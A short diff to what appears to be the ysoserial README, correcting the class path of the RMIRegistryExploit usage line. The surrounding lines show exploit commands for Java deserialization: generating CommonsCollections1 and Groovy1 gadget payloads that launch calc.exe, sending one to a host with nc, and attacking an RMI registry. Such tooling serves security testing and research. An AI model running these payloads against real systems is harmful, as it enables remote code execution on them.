@@ -59,7 +59,7 @@ $ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 calc.exe | xxd
 $ java -jar ysoserial-0.0.4-all.jar Groovy1 calc.exe > groovypayload.bin
 $ nc 10.10.10.10 < groovypayload.bin
 
-$ java -cp ysoserial-0.0.4-all.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+$ java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
 ## Installation
